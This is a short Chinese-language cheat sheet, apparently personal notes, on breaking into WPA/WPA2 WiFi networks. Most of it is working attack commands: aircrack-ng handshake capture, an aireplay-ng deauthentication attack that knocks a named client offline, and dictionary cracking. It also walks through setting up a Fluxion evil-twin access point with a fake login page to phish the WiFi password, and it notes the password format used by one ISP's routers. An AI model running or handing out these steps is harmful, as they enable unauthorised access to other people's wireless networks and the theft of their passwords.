
被动方式
```sh
lusb # 看有没有显示
ifconfig # 查看 wlan0 无线网卡
airmon-ng # 查看是否支持监听模式 显示wlan0 支持
airmon-ng start wlan0 # 开启监听

airodump-ng wlan0  # 扫描 wifi

# BSSID             PWR   Beacons	CH  # CH wifi频段11
# 60:32:B1:56:3F:B2 -32   24      11
# BSSID              STATTION
# 60:32:B1:56:3F:B2  CC:08:FB:DD:42:18

# 只用此方式抓包较慢
airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/lingdu/handshake wlan0

# 第一行 CH  9 ][ Elapsed: 27 s ][ 2023-01-14 22:40 ][ WPA handshake: 34:36:54:D8:1F:A9 # 显示 handshake 为攻击成功, 这时Ctrl+C退出命令
```

ACK方式
```sh
# 方式1 上面的不要关闭 执行下面
aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c CC:08:FB:DD:42:18 wlan0
# 方式2 停止扫描， 执行攻击， 马上开启扫描。
# -0: 通知设备断开连接 10: 攻击次数 -a:目标bssid -c: 目标踢下线的设备
```

aircrack-ng -w ~/password.txt -b ~/handshake-01.cap


## 钓鱼 fluxion
https://github.com/FluxionNetwork/fluxion

```sh
./fluxion.sh -i

# 2.Handshake Snooper 检索WPA/WPA2加密散列。
# 3.扫描所有信道 （2.4G和5G),  绿色是正在有人在连接且扫描到的。白色不确定是否有连接。
# 选wifi，显示026直接输入26回车
# 2.重置攻击
# 2.aireplay-ng 解除认证方式
# hash 验证方法: cowpatty

# 返回
# 1 创建一个邪恶的双胞胎接入点
# 1 创建SSL证书
# 2 仿真（断开原网络的选项 需要测试，不确定效果）
# 认证页面 选3中文。 (如果确认对方路由器也可选别的)
```
## Dictionary

天翼wifi:8位数字密码，例如 xx4yyykw


## Article
[零度WIFI安全测试](https://www.youtube.com/watch?v=_9q9Cl555wg)